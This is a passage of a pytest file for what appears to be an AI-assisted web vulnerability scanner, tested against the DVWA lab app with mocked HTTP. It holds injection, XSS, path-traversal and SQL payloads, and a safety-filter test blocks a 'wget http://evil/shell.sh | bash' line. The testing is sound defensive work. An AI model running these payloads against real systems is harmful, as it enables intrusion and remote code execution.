    assert finding["title"] == "确认存在命令注入"
    assert finding["category"] == "command_injection"
    assert finding["details"]["evidence_type"] == "command_echo_marker"
    assert "NOVA_CMD" in finding["request_response"]["matched"]


def test_auditor_confirms_dvwa_exec_post_form_command_injection(monkeypatch) -> None:
    calls: list[tuple[str, dict[str, str]]] = []

    def fake_post_form(_self, url: str, fields: dict[str, str]):
        calls.append((url, fields))
        body = "ping output NOVA_CMD" if "echo NOVA_CMD" in fields.get("ip", "") else "ping output"
        return {
            "url": url,
            "status_code": 200,
            "headers": {"Content-Type": "text/html"},
            "body": body,
            "body_length": len(body),
        }

    monkeypatch.setattr("backend.helper.evidence.http.HttpClient.post_form", fake_post_form)
    webscan = {
        "target": "http://127.0.0.1/DVWA/vulnerabilities/exec/",
        "reachable": True,
        "headers": {
            "Content-Security-Policy": "default-src 'self'",
            "X-Frame-Options": "DENY",
            "X-Content-Type-Options": "nosniff",
            "Referrer-Policy": "no-referrer",
        },
        "cookies": [],
        "forms": [],
        "pages": [
            {
                "final_url": "http://127.0.0.1/DVWA/vulnerabilities/exec/",
                "active_testable": True,
                "title": "Vulnerability: Command Injection :: DVWA",
                "forms": [
                    {
                        "method": "POST",
                        "action": "http://127.0.0.1/DVWA/vulnerabilities/exec/",
                        "active_testable": True,
                        "inputs": [
                            {"name": "ip", "type": "text", "value": ""},
                            {"name": "Submit", "type": "submit", "value": "Submit"},
                        ],
                    }
                ],
                "input_points": [],
                "scripts": [],
            }
        ],
    }

    audit = AuditorAgent(settings(active_scan=True, llm_payload_advisor=False)).audit(webscan)
    finding = next(item for item in audit["findings"] if item["category"] == "command_injection")

    assert finding["status"] == "确认漏洞"
    assert finding["details"]["rule_id"] == "dvwa_command_injection_form"
    assert finding["details"]["method"] == "POST"
    assert "NOVA_CMD" in finding["request_response"]["matched"]
    assert calls[0][1]["ip"].startswith("127.0.0.1")


def test_auditor_detects_passive_error_disclosure() -> None:
    webscan = {
        "target": "http://example.com/debug",
        "reachable": True,
        "headers": {
            "Content-Security-Policy": "default-src 'self'",
            "X-Frame-Options": "DENY",
            "X-Content-Type-Options": "nosniff",
            "Referrer-Policy": "no-referrer",
        },
        "cookies": [],
        "forms": [],
        "pages": [
            {
                "final_url": "http://example.com/debug",
                "html_sample": "Traceback (most recent call last): File /var/www/app.py line 1",
                "input_points": [],
            }
        ],
    }

    audit = AuditorAgent(settings(active_scan=False, llm_payload_advisor=False)).audit(webscan)
    finding = next(item for item in audit["findings"] if item["status"] == "确认漏洞")

    assert finding["category"] == "information_disclosure"
    assert finding["details"]["evidence_type"] == "body_pattern"
    assert finding["details"]["leak_type"] in {"stack_trace", "unix_path"}


def test_active_payload_safety_filter_blocks_dangerous_probe() -> None:
    allowed, reason = safe_active_payload("127.0.0.1; echo NOVA_CMD")
    blocked, block_reason = safe_active_payload("127.0.0.1; wget http://evil/shell.sh | bash")

    assert allowed is True
    assert reason == "通过主动探测安全过滤"
    assert blocked is False
    assert "外连" in block_reason


def test_auditor_detects_csp_javascript_session_and_crypto_signals() -> None:
    jwt_alg_none = "eyJhbGciOiJub25lIn0.eyJzdWIiOiIxIn0."
    webscan = {
        "target": "http://example.com/app",
        "reachable": True,
        "headers": {
            "Content-Security-Policy": "default-src * 'unsafe-inline'; script-src 'unsafe-eval'",
            "X-Frame-Options": "DENY",
            "X-Content-Type-Options": "nosniff",
            "Referrer-Policy": "no-referrer",
        },
        "cookies": [{"name": "SESSIONID", "value": "12345678", "secure": False, "httponly": False, "samesite": ""}, {"name": "jwt", "value": jwt_alg_none, "secure": True, "httponly": True, "samesite": "Lax"}],
        "forms": [],
        "pages": [
            {
                "final_url": "http://example.com/app",
                "html_sample": "token=0123456789abcdef0123456789abcdef",
                "scripts": [
                    {
                        "url": "http://example.com/app.js",
                        "content_sample": "const api_key='NOVA_SECRET_TOKEN'; document.body.innerHTML=location.hash; //# sourceMappingURL=app.js.map",
                        "hash": "demo",
                    }
                ],
                "input_points": [],
            }
        ],
    }

    audit = AuditorAgent(settings(active_scan=False, llm_payload_advisor=False)).audit(webscan)
    categories = {item["category"] for item in audit["findings"]}

    assert {"csp_weakness", "javascript_exposure", "weak_session", "crypto_weakness"} <= categories
    assert any(item["status"] == "确认漏洞" and item["category"] == "csp_weakness" for item in audit["findings"])
    assert any(item["status"] == "确认漏洞" and item["category"] == "javascript_exposure" for item in audit["findings"])
    assert any(item["details"].get("signal") == "numeric_session_id" for item in audit["findings"])
    assert any(item["details"].get("weakness") == "jwt_alg_none" for item in audit["findings"])


def test_auditor_confirms_dvwa_javascript_client_side_token_bypass(monkeypatch) -> None:
    calls: list[dict[str, str]] = []

    def fake_post_form(self, url: str, fields: dict[str, str]):
        calls.append(dict(fields))
        body = "<p style='color:red'>Well done!</p>" if fields.get("token") == "XXsseccusXX" else "<p>Invalid token.</p>"
        return {
            "url": url,
            "status_code": 200,
            "headers": {},
            "body": body,
            "body_length": len(body),
        }

    monkeypatch.setattr("backend.helper.evidence.http.HttpClient.post_form", fake_post_form)
    webscan = {
        "target": "http://127.0.0.1/DVWA/vulnerabilities/javascript/",
        "reachable": True,
        "headers": {
            "Content-Security-Policy": "default-src 'self'",
            "X-Frame-Options": "DENY",
            "X-Content-Type-Options": "nosniff",
            "Referrer-Policy": "no-referrer",
        },
        "cookies": [],
        "forms": [],
        "pages": [
            {
                "final_url": "http://127.0.0.1/DVWA/vulnerabilities/javascript/",
                "title": "Vulnerability: JavaScript Attacks :: DVWA",
                "forms": [
                    {
                        "method": "POST",
                        "action": "http://127.0.0.1/DVWA/vulnerabilities/javascript/",
                        "inputs": [
                            {"name": "token", "type": "hidden", "value": ""},
                            {"name": "phrase", "type": "text", "value": "ChangeMe"},
                            {"name": "send", "type": "submit", "value": "Submit"},
                        ],
                    }
                ],
                "input_points": [],
                "scripts": [],
            }
        ],
    }

    audit = AuditorAgent(settings(active_scan=True, llm_payload_advisor=False)).audit(webscan)
    finding = next(item for item in audit["findings"] if item["category"] == "javascript_exposure")

    assert finding["status"] == "确认漏洞"
    assert finding["title"] == "确认存在 JavaScript 客户端校验绕过"
    assert finding["details"]["evidence_type"] == "client_side_token_bypass"
    assert finding["request_response"]["successful_level_guess"] == "medium"
    assert len(calls) == 2
    assert calls[-1]["phrase"] == "success"


def test_auditor_confirms_dvwa_csp_external_script_bypass(monkeypatch) -> None:
    calls: list[dict[str, str]] = []

    def fake_post_form(self, url: str, fields: dict[str, str]):
        calls.append(dict(fields))
        include = fields.get("include", "")
        body = f"<html><script src='{include}'></script></html>"
        return {
            "url": url,
            "status_code": 200,
            "headers": {"Content-Security-Policy": "script-src 'self' https://digi.ninja ;"},
            "body": body,
            "body_length": len(body),
        }

    monkeypatch.setattr("backend.helper.evidence.http.HttpClient.post_form", fake_post_form)
    webscan = {
        "target": "http://127.0.0.1/DVWA/vulnerabilities/csp/",
        "reachable": True,
        "headers": {
            "Content-Security-Policy": "script-src 'self' https://digi.ninja ;",
            "X-Frame-Options": "DENY",
            "X-Content-Type-Options": "nosniff",
            "Referrer-Policy": "no-referrer",
        },
        "cookies": [],
        "forms": [],
        "pages": [
            {
                "final_url": "http://127.0.0.1/DVWA/vulnerabilities/csp/",
                "title": "Vulnerability: Content Security Policy (CSP) Bypass :: DVWA",
                "forms": [
                    {
                        "method": "POST",
                        "action": "http://127.0.0.1/DVWA/vulnerabilities/csp/",
                        "active_testable": True,
                        "inputs": [
                            {"name": "include", "type": "text", "value": ""},
                            {"name": "", "type": "submit", "value": "Include"},
                        ],
                    }
                ],
                "input_points": [],
                "scripts": [],
            }
        ],
    }

    audit = AuditorAgent(settings(active_scan=True, llm_payload_advisor=False)).audit(webscan)
    finding = next(item for item in audit["findings"] if item["category"] == "csp_weakness" and item["status"] == "确认漏洞")

    assert finding["title"] == "确认存在 CSP 白名单脚本加载绕过"
    assert finding["details"]["rule_id"] == "dvwa_csp_bypass"
    assert finding["details"]["evidence_type"] == "external_script_whitelist_bypass"
    assert "https://digi.ninja/dvwa/alert.js" in finding["payloads"]
    assert calls[0]["include"] == "https://digi.ninja/dvwa/alert.js"


def test_auditor_confirms_dvwa_captcha_bypass_without_posting(monkeypatch) -> None:
    def fail_post(*_args, **_kwargs):
        raise AssertionError("CAPTCHA bypass rule must not submit password-change PoC")

    monkeypatch.setattr("backend.helper.evidence.http.HttpClient.post_form", fail_post)
    webscan = {
        "target": "http://127.0.0.1/DVWA/vulnerabilities/captcha/",
        "reachable": True,
        "headers": {
            "Content-Security-Policy": "default-src 'self'",
            "X-Frame-Options": "DENY",
            "X-Content-Type-Options": "nosniff",
            "Referrer-Policy": "no-referrer",
        },
        "cookies": [],
        "forms": [],
        "pages": [
            {
                "final_url": "http://127.0.0.1/DVWA/vulnerabilities/captcha/",
                "title": "Vulnerability: Insecure CAPTCHA :: DVWA",
                "html_sample": "Vulnerability: Insecure CAPTCHA <!-- **DEV NOTE**   Response: 'hidd3n_valu3'   &&   User-Agent: 'reCAPTCHA'   **/DEV NOTE** -->",
                "forms": [
                    {
                        "method": "POST",
                        "action": "http://127.0.0.1/DVWA/vulnerabilities/captcha/",
                        "active_testable": True,
                        "inputs": [
                            {"name": "step", "type": "hidden", "value": "1"},
                            {"name": "password_new", "type": "password", "value": ""},
                            {"name": "password_conf", "type": "password", "value": ""},
                            {"name": "g-recaptcha-response", "type": "hidden", "value": ""},
                            {"name": "Change", "type": "submit", "value": "Change"},
                        ],
                    }
                ],
                "input_points": [],
                "scripts": [],
            }
        ],
    }

    audit = AuditorAgent(settings(active_scan=True, llm_payload_advisor=False)).audit(webscan)
    finding = next(item for item in audit["findings"] if item["category"] == "captcha_bypass")

    assert finding["status"] == "确认漏洞"
    assert finding["details"]["evidence_type"] == "dvwa_insecure_captcha_flow"
    assert finding["poc"]["execution"] == "manual"
    assert finding["executed_payloads"] == []
    assert any("hidd3n_valu3" in payload for payload in finding["payloads"])


def test_auditor_skips_page_rules_outside_focused_target_path(monkeypatch) -> None:
    def fail_post(*_args, **_kwargs):
        raise AssertionError("off-target page rules must not submit requests")

    monkeypatch.setattr("backend.helper.evidence.http.HttpClient.post_form", fail_post)
    webscan = {
        "target": "http://127.0.0.1/DVWA/vulnerabilities/exec/",
        "reachable": True,
        "headers": {
            "Content-Security-Policy": "default-src 'self'",
            "X-Frame-Options": "DENY",
            "X-Content-Type-Options": "nosniff",
            "Referrer-Policy": "no-referrer",
        },
        "cookies": [],
        "forms": [],
        "pages": [
            {
                "final_url": "http://127.0.0.1/DVWA/vulnerabilities/exec/",
                "active_testable": True,
                "title": "Vulnerability: Command Injection :: DVWA",
                "forms": [],
                "input_points": [],
                "scripts": [],
            },
            {
                "final_url": "http://127.0.0.1/DVWA/vulnerabilities/captcha/",
                "active_testable": False,
                "active_scope_reason": "outside_target_path",
                "title": "Vulnerability: Insecure CAPTCHA :: DVWA",
                "html_sample": "Vulnerability: Insecure CAPTCHA g-recaptcha-response",
                "forms": [
                    {
                        "method": "POST",
                        "action": "http://127.0.0.1/DVWA/vulnerabilities/captcha/",
                        "active_testable": False,
                        "active_scope_reason": "outside_target_path",
                        "inputs": [
                            {"name": "step", "type": "hidden", "value": "1"},
                            {"name": "password_new", "type": "password", "value": ""},
                            {"name": "password_conf", "type": "password", "value": ""},
                            {"name": "g-recaptcha-response", "type": "hidden", "value": ""},
                            {"name": "Change", "type": "submit", "value": "Change"},
                        ],
                    }
                ],
                "input_points": [],
                "scripts": [],
            },
        ],
    }

    audit = AuditorAgent(settings(active_scan=True, llm_payload_advisor=False)).audit(webscan)

    assert all(item["category"] != "captcha_bypass" for item in audit["findings"])


def test_auditor_confirms_dvwa_weak_session_id_generation(monkeypatch) -> None:
    calls: list[str] = []

    class Headers(dict):
        def __init__(self, cookie_value: str) -> None:
            super().__init__({"Content-Type": "text/html"})
            self.cookie_value = cookie_value

        def get_content_charset(self):
            return "utf-8"

        def get_all(self, name, _default=None):
            if name.lower() == "set-cookie":
                return [f"dvwaSession={self.cookie_value}; path=/DVWA/vulnerabilities/weak_id/"]
            return []

    class Response:
        status = 200

        def __init__(self, url: str, cookie_value: str) -> None:
            self.url = url
            self.headers = Headers(cookie_value)

        def __enter__(self):
            return self

        def __exit__(self, exc_type, exc, tb):
            return False

        def read(self, *_):
            return b"<html>Weak Session IDs</html>"

    def fake_urlopen(request, **_kwargs):
        calls.append(request.full_url)
        return Response(request.full_url, str(len(calls)))

    monkeypatch.setattr("backend.helper.agent.sub_agent.auditor.urlopen", fake_urlopen)
    webscan = {
        "target": "http://127.0.0.1/DVWA/vulnerabilities/weak_id/",
        "reachable": True,
        "headers": {
            "Content-Security-Policy": "default-src 'self'",
            "X-Frame-Options": "DENY",
            "X-Content-Type-Options": "nosniff",
            "Referrer-Policy": "no-referrer",
        },
        "cookies": [],
        "forms": [],
        "pages": [
            {
                "final_url": "http://127.0.0.1/DVWA/vulnerabilities/weak_id/",
                "forms": [
                    {
                        "method": "GET",
                        "action": "http://127.0.0.1/DVWA/vulnerabilities/weak_id/",
                        "page_url": "http://127.0.0.1/DVWA/vulnerabilities/weak_id/",
                        "active_testable": True,
                        "inputs": [{"name": "Generate", "type": "submit", "value": "Generate"}],
                    }
                ],
                "input_points": [],
            }
        ],
    }

    audit = AuditorAgent(settings(active_scan=True, llm_payload_advisor=False)).audit(webscan)
    finding = next(item for item in audit["findings"] if item["category"] == "weak_session")

    assert finding["status"] == "确认漏洞"
    assert finding["title"] == "确认存在弱会话 ID 生成风险"
    assert finding["details"]["evidence_type"] == "weak_session_sequence"
    assert finding["details"]["signal"] == "sequential_numeric_cookie"
    assert finding["request_response"]["observed_values"] == ["1", "2", "3"]
    assert all("Generate=Generate" in url for url in calls)


def test_auditor_confirms_dvwa_weak_session_id_generation_post_form(monkeypatch) -> None:
    calls: list[tuple[str, str, bytes | None]] = []

    class Headers(dict):
        def __init__(self, cookie_value: str) -> None:
            super().__init__({"Content-Type": "text/html"})
            self.cookie_value = cookie_value

        def get_content_charset(self):
            return "utf-8"

        def get_all(self, name, _default=None):
            if name.lower() == "set-cookie":
                return [f"dvwaSession={self.cookie_value}; path=/DVWA/vulnerabilities/weak_id/"]
            return []

    class Response:
        status = 200

        def __init__(self, url: str, cookie_value: str) -> None:
            self.url = url
            self.headers = Headers(cookie_value)

        def __enter__(self):
            return self

        def __exit__(self, exc_type, exc, tb):
            return False

        def read(self, *_):
            return b"<html>Weak Session IDs</html>"

    def fake_urlopen(request, **_kwargs):
        calls.append((request.full_url, request.get_method(), request.data))
        return Response(request.full_url, str(len(calls)))

    monkeypatch.setattr("backend.helper.agent.sub_agent.auditor.urlopen", fake_urlopen)
    webscan = {
        "target": "http://127.0.0.1/DVWA/vulnerabilities/weak_id/",
        "reachable": True,
        "headers": {
            "Content-Security-Policy": "default-src 'self'",
            "X-Frame-Options": "DENY",
            "X-Content-Type-Options": "nosniff",
            "Referrer-Policy": "no-referrer",
        },
        "cookies": [],
        "forms": [],
        "pages": [
            {
                "final_url": "http://127.0.0.1/DVWA/vulnerabilities/weak_id/",
                "forms": [
                    {
                        "method": "POST",
                        "action": "http://127.0.0.1/DVWA/vulnerabilities/weak_id/",
                        "page_url": "http://127.0.0.1/DVWA/vulnerabilities/weak_id/",
                        "active_testable": True,
                        "inputs": [{"name": "", "type": "submit", "value": "Generate"}],
                    }
                ],
                "input_points": [],
            }
        ],
    }

    audit = AuditorAgent(settings(active_scan=True, llm_payload_advisor=False)).audit(webscan)
    finding = next(item for item in audit["findings"] if item["category"] == "weak_session")

    assert finding["status"] == "确认漏洞"
    assert finding["details"]["evidence_type"] == "weak_session_sequence"
    assert finding["request_response"]["method"] == "POST"
    assert finding["request_response"]["observed_values"] == ["1", "2", "3"]
    assert finding["payloads"] == ["POST http://127.0.0.1/DVWA/vulnerabilities/weak_id/ (Generate)"]
    assert all(method == "POST" for _url, method, _data in calls)
    assert all(url == "http://127.0.0.1/DVWA/vulnerabilities/weak_id/" for url, _method, _data in calls)


def test_auditor_confirms_open_redirect_with_external_location(monkeypatch) -> None:
    def fake_no_redirect(self, url: str):
        return {
            "url": url,
            "status_code": 302,
            "headers": {"Location": "https://nova.invalid/redirect-check"},
            "body": "",
            "body_length": 0,
        }

    monkeypatch.setattr("backend.helper.evidence.http.HttpClient.get_no_redirect", fake_no_redirect)
    webscan = {
        "target": "http://example.com/redirect?next=/home",
        "reachable": True,
        "headers": {
            "Content-Security-Policy": "default-src 'self'; object-src 'none'; base-uri 'self'; frame-ancestors 'none'",
            "X-Frame-Options": "DENY",
            "X-Content-Type-Options": "nosniff",
            "Referrer-Policy": "no-referrer",
        },
        "cookies": [],
        "forms": [],
        "pages": [
            {
                "final_url": "http://example.com/redirect?next=/home",
                "input_points": [{"name": "next", "method": "GET", "url": "http://example.com/redirect?next=/home", "active_testable": True}],
            }
        ],
    }

    audit = AuditorAgent(settings(active_scan=True, llm_payload_advisor=False)).audit(webscan)
    finding = next(item for item in audit["findings"] if item["category"] == "open_redirect")

    assert finding["status"] == "确认漏洞"
    assert finding["details"]["evidence_type"] == "external_redirect"
    assert "nova.invalid" in finding["request_response"]["matched"]


def test_auditor_marks_ssrf_stored_xss_and_upload_as_candidates(monkeypatch) -> None:
    def fail_post(*_args, **_kwargs):
        raise AssertionError("default candidate rules must not submit forms")

    monkeypatch.setattr("backend.helper.evidence.http.HttpClient.post_form", fail_post)
    monkeypatch.setattr("backend.helper.evidence.http.HttpClient.post_multipart_text_file", fail_post)
    webscan = {
        "target": "http://example.com/post",
        "reachable": True,
        "headers": {
            "Content-Security-Policy": "default-src 'self'; object-src 'none'; base-uri 'self'; frame-ancestors 'none'",
            "X-Frame-Options": "DENY",
            "X-Content-Type-Options": "nosniff",
            "Referrer-Policy": "no-referrer",
        },
        "cookies": [],
        "forms": [
            {
                "method": "POST",
                "action": "http://example.com/comment",
                "enctype": "application/x-www-form-urlencoded",
                "inputs": [{"name": "comment", "type": "text", "value": ""}, {"name": "submit", "type": "submit", "value": "save"}],
                "candidate_purpose": "stored_xss_candidate",
                "file_inputs": [],
            },
            {
                "method": "POST",
                "action": "http://example.com/upload",
                "enctype": "multipart/form-data",
                "inputs": [{"name": "avatar", "type": "file", "value": ""}],
                "candidate_purpose": "file_upload",
                "file_inputs": [{"name": "avatar", "type": "file", "value": ""}],
            },
        ],
        "pages": [
            {
                "final_url": "http://example.com/fetch?url=http://example.org",
                "input_points": [{"name": "url", "method": "GET", "url": "http://example.com/fetch?url=http://example.org", "active_testable": True}],
            }
        ],
    }

    audit = AuditorAgent(settings(active_scan=True, llm_payload_advisor=False)).audit(webscan)
    candidate_categories = {item["category"] for item in audit["findings"] if item["status"] == "疑似漏洞"}

    assert {"ssrf", "stored_xss", "file_upload"} <= candidate_categories
    assert any(item["details"].get("opt_in_required") == "NOVA_SSRF_CALLBACK_URL" for item in audit["findings"])
    assert any(item["details"].get("opt_in_required") == "NOVA_STORED_XSS_PROBES=true" for item in audit["findings"])
    assert any(item["details"].get("opt_in_required") == "NOVA_FILE_UPLOAD_PROBES=true" for item in audit["findings"])
    upload_finding = next(item for item in audit["findings"] if item["category"] == "file_upload")
    assert upload_finding["details"]["target_param"] == "avatar"
    assert any("nova-upload-check.txt" in item for item in upload_finding["details"]["candidate_payloads"])


def test_file_upload_probe_confirms_same_origin_readback(monkeypatch) -> None:
    captured = {}

    def fake_upload(self, url, fields, file_field, filename, content):
        captured.update({"url": url, "fields": fields, "file_field": file_field, "filename": filename, "content": content})
        return {
            "url": url,
            "status_code": 200,
            "headers": {},
            "set_cookie": [],
            "body": '<a href="/uploads/nova-upload-check.txt">uploaded</a>',
            "body_length": 55,
        }

    def fake_get(self, url):
        assert url == "http://example.com/uploads/nova-upload-check.txt"
        return {
            "url": url,
            "status_code": 200,
            "headers": {},
            "set_cookie": [],
            "body": captured["content"],
            "body_length": len(captured["content"]),
        }

    monkeypatch.setattr("backend.helper.evidence.http.HttpClient.post_multipart_text_file", fake_upload)
    monkeypatch.setattr("backend.helper.evidence.http.HttpClient.get", fake_get)
    webscan = {
        "target": "http://example.com/upload/",
        "reachable": True,
        "headers": {
            "Content-Security-Policy": "default-src 'self'; object-src 'none'; base-uri 'self'; frame-ancestors 'none'",
            "X-Frame-Options": "DENY",
            "X-Content-Type-Options": "nosniff",
            "Referrer-Policy": "no-referrer",
        },
        "cookies": [],
        "forms": [],
        "pages": [
            {
                "final_url": "http://example.com/upload/",
                "forms": [
                    {
                        "method": "POST",
                        "action": "http://example.com/upload/",
                        "enctype": "multipart/form-data",
                        "inputs": [
                            {"name": "user_token", "type": "hidden", "value": "token"},
                            {"name": "avatar", "type": "file", "value": ""},
                        ],
                        "candidate_purpose": "file_upload",
                        "file_inputs": [{"name": "avatar", "type": "file", "value": ""}],
                    }
                ],
            }
        ],
    }

    audit = AuditorAgent(settings(active_scan=True, file_upload_probes=True, llm_payload_advisor=False)).audit(webscan)
    finding = next(item for item in audit["findings"] if item["category"] == "file_upload")

    assert finding["status"] == "确认漏洞"
    assert finding["details"]["evidence_type"] == "upload_same_origin_readback"
    assert finding["details"]["target_param"] == "avatar"
    assert captured["filename"] == "nova-upload-check.txt"
    assert captured["content"].startswith("NOVA_UPLOAD_")


def test_auditor_rules_detect_headers_cookies_forms_and_query() -> None:
    webscan = {
        "target": "http://example.com/?q=1",
        "reachable": True,
        "headers": {"Server": "mock"},
        "cookies": [{"name": "sid", "secure": False, "httponly": False, "samesite": ""}],
        "forms": [{"method": "POST", "action": "http://example.com/save", "inputs": [{"name": "email", "type": "email"}]}],
        "pages": [
            {
                "final_url": "http://example.com/?q=1",
                "headers": {"Server": "mock"},
                "input_points": [{"name": "q", "method": "GET", "url": "http://example.com/?q=1"}],
            }
        ],
    }

    audit = AuditorAgent(settings()).audit(webscan)
    titles = {item["title"] for item in audit["findings"]}

    assert "缺少 Content-Security-Policy 响应头" in titles
    assert "Server 响应头信息泄露" in titles
    assert any(title.startswith("Cookie 缺少安全属性") for title in titles)
    assert "表单缺少明显的 CSRF Token" in titles
    assert "URL 参数需要注入风险验证" in titles
    assert audit["summary"]["llm_enabled"] is False


def test_auditor_confirms_get_state_change_csrf_form() -> None:
    webscan = {
        "target": "http://127.0.0.1/DVWA/vulnerabilities/csrf/",
        "reachable": True,
        "headers": {
            "Content-Security-Policy": "default-src 'self'; object-src 'none'; base-uri 'self'; frame-ancestors 'none'",
            "X-Frame-Options": "DENY",
            "X-Content-Type-Options": "nosniff",
            "Referrer-Policy": "no-referrer",
        },
        "cookies": [],
        "forms": [
            {
                "method": "GET",
                "action": "http://127.0.0.1/DVWA/vulnerabilities/csrf/",
                "inputs": [
                    {"name": "password_new", "type": "password", "value": ""},
                    {"name": "password_conf", "type": "password", "value": ""},
                    {"name": "Change", "type": "submit", "value": "Change"},
                ],
            }
        ],
        "pages": [],
    }

    audit = AuditorAgent(settings(active_scan=False, llm_payload_advisor=False)).audit(webscan)
    finding = next(item for item in audit["findings"] if item["category"] == "csrf")

    assert finding["status"] == "确认漏洞"
    assert finding["title"] == "确认存在 GET 状态变更 CSRF 风险"
    assert finding["details"]["evidence_type"] == "get_state_change_form"
    assert audit["summary"]["confirmed"] == 1


def test_payload_advisor_adds_confirmed_csrf_poc_templates(monkeypatch) -> None:
    def fail_if_called(*_args, **_kwargs):
        raise AssertionError("local CSRF templates should not require LLM calls")

    monkeypatch.setattr("backend.helper.llm.client.LLMClient.chat", fail_if_called)
    webscan = {
        "target": "http://127.0.0.1/DVWA/vulnerabilities/csrf/",
        "final_url": "http://127.0.0.1/DVWA/vulnerabilities/csrf/",
        "forms": [
            {
                "method": "GET",
                "action": "http://127.0.0.1/DVWA/vulnerabilities/csrf/",
                "inputs": [
                    {"name": "password_new", "type": "password", "value": ""},
                    {"name": "password_conf", "type": "password", "value": ""},
                    {"name": "Change", "type": "submit", "value": "Change"},
                ],
            }
        ],
        "pages": [],
    }
    findings = [
        {
            "id": "NOVA-F-001",
            "title": "确认存在 GET 状态变更 CSRF 风险",
            "status": "确认漏洞",
            "category": "csrf",
            "url": "http://127.0.0.1/DVWA/vulnerabilities/csrf/",
            "payloads": ["无 Token 的 GET 状态变更请求"],
            "details": {
                "method": "GET",
                "input_names": ["password_new", "password_conf", "change"],
                "evidence_type": "get_state_change_form",
            },
        }
    ]

    result = LLMPayloadAdvisor(
        settings(llm_baseurl="http://llm.local", llm_apikey="k", llm_provider="deepseek", llm_on_local_targets=False)
    ).generate(webscan, findings)

    allowed = [item for item in result["items"] if item["allowed"] and item["category"] == "csrf"]
    assert len(allowed) == 2
    assert all(item["source"] == "local_progression_template" for item in allowed)
    assert any("password_new=NOVA_CSRF_TEST_PASSWORD" in item["payload"] for item in allowed)
    assert any("password_conf=NOVA_CSRF_TEST_PASSWORD" in item["payload"] for item in allowed)
    assert any(item["payload"].startswith("<img src=") for item in allowed)


def test_payload_advisor_adds_type_specific_progression_templates(monkeypatch) -> None:
    def fail_if_called(*_args, **_kwargs):
        raise AssertionError("local progression templates should not require LLM calls")

    monkeypatch.setattr("backend.helper.llm.client.LLMClient.chat", fail_if_called)
    webscan = {
        "target": "http://127.0.0.1/DVWA/",
        "final_url": "http://127.0.0.1/DVWA/",
        "pages": [
            {
                "input_points": [
                    {"name": "name", "method": "GET", "url": "http://127.0.0.1/DVWA/vulnerabilities/xss_r/?name=hyx"},
                    {"name": "page", "method": "GET", "url": "http://127.0.0.1/DVWA/vulnerabilities/fi/?page=include.php"},
                    {"name": "ip", "method": "GET", "url": "http://127.0.0.1/DVWA/vulnerabilities/exec/?ip=127.0.0.1"},
                ]
            }
        ],
    }
    findings = [
        {
            "id": "NOVA-XSS-001",
            "status": "确认漏洞",
            "category": "xss",
            "url": "http://127.0.0.1/DVWA/vulnerabilities/xss_r/?name=%3Cscript%3E",
            "details": {"target_param": "name", "evidence_type": "raw_xss_reflection"},
            "payloads": ["<script>alert('NOVA_XSS')</script>"],
        },
        {
            "id": "NOVA-LFI-001",
            "status": "确认漏洞",
            "category": "lfi",
            "url": "http://127.0.0.1/DVWA/vulnerabilities/fi/?page=include.php",
            "details": {"target_param": "page", "evidence_type": "file_read_signature"},
            "payloads": ["../../../../../../etc/passwd"],
        },
        {
            "id": "NOVA-CMD-001",
            "status": "确认漏洞",
            "category": "command_injection",
            "url": "http://127.0.0.1/DVWA/vulnerabilities/exec/?ip=127.0.0.1",
            "details": {"target_param": "ip", "evidence_type": "command_echo_marker"},
            "payloads": ["127.0.0.1; echo NOVA_CMD"],
        },
    ]

    result = LLMPayloadAdvisor(
        settings(
            llm_baseurl="http://llm.local",
            llm_apikey="k",
            llm_provider="deepseek",
            llm_on_local_targets=False,
            llm_payload_max_per_param=10,
        )
    ).generate(webscan, findings)

    allowed = [item for item in result["items"] if item["allowed"]]
    assert any(item["category"] == "xss" and "svg/onload" in item["payload"] for item in allowed)
    assert any(item["category"] == "lfi" and "etc/passwd" in item["payload"] for item in allowed)
    assert any(item["category"] == "command_injection" and "NOVA_CMD_VERIFY" in item["payload"] for item in allowed)


def test_auditor_reports_missing_auth_context() -> None:
    webscan = {
        "target": "http://example.com/login.php",
        "reachable": True,
        "headers": {},
        "cookies": [],
        "forms": [],
        "pages": [],
        "auth": {"configured": False},
        "target_probe": {"auth_required": True},
    }

    audit = AuditorAgent(settings()).audit(webscan)

    assert any(item["id"] == "NOVA-AUTH-000" for item in audit["findings"])


def test_auditor_reports_login_page_without_credentials() -> None:
    webscan = {
        "target": "http://127.0.0.1/DVWA/vulnerabilities/fi/?page=include.php",
        "final_url": "http://127.0.0.1/DVWA/login.php",
        "reachable": True,
        "title": "Login :: Damn Vulnerable Web Application (DVWA)",
        "headers": {},
        "cookies": [],
        "forms": [],
        "pages": [],
        "auth": {"configured": False},
        "target_probe": {"auth_required": False},
    }

    audit = AuditorAgent(settings(llm_payload_advisor=False)).audit(webscan)

    assert any(item["id"] == "NOVA-AUTH-002" for item in audit["findings"])


def test_report_shows_auth_notice_when_confirmed_filter_is_enabled(tmp_path: Path, monkeypatch) -> None:
    monkeypatch.delenv("NOVA_REPORT_CONFIRMED_ONLY", raising=False)
    audit = {
        "target": "http://127.0.0.1/DVWA/vulnerabilities/fi/?page=include.php",
        "audited_at": "2026-05-22T00:00:00+00:00",
        "findings": [
            {
                "id": "NOVA-AUTH-002",
                "title": "当前扫描停留在登录页，未进入目标业务页面",
                "severity": "Info",
                "confidence": "High",
                "status": "扫描提示",
                "category": "authentication",
                "url": "http://127.0.0.1/DVWA/login.php",
                "evidence": "扫描结果显示最终页面是登录页。",
                "payloads": [],
                "request_response": {},
                "details": {"evidence_type": "login_page"},
                "recommendation": "重新获取有效登录态 Cookie。",
                "llm_analysis": "",
            }
        ],
        "llm_payload_advice": [],
        "llm_payload_summary": {"enabled": False, "status": "disabled", "message": "", "report_only": True},
    }

    report, _, markdown_path = PayloadAgent().build_report(
        "http://127.0.0.1/DVWA/vulnerabilities/fi/?page=include.php",
        {"status_code": 200, "title": "Login :: Damn Vulnerable Web Application (DVWA)"},
        audit,
        tmp_path,
        target_probe={
            "reachable": True,
            "final_url": "http://127.0.0.1/DVWA/login.php",
            "auth_required": True,
            "auth_type_guess": "login_page",
            "auth": {},
            "redirect_chain": [],
            "probe_errors": [],
        },
    )

    markdown = markdown_path.read_text(encoding="utf-8-sig")
    assert report["summary"]["total_findings"] == 1
    assert "当前扫描停留在登录页" in markdown


def test_llm_payload_safety_filter_allows_blind_pair_and_blocks_dangerous_payloads() -> None:
    filter_ = PayloadSafetyFilter()
    candidates = [
        {
            "input_point": "http://127.0.0.1/DVWA/vulnerabilities/sqli_blind/",
            "category": "sqli_blind",
            "target_param": "id",
            "true_payload": "1' AND '1'='1' -- -",
            "false_payload": "1' AND '1'='2' -- -",
            "expected_true_signal": "User ID exists in the database.",
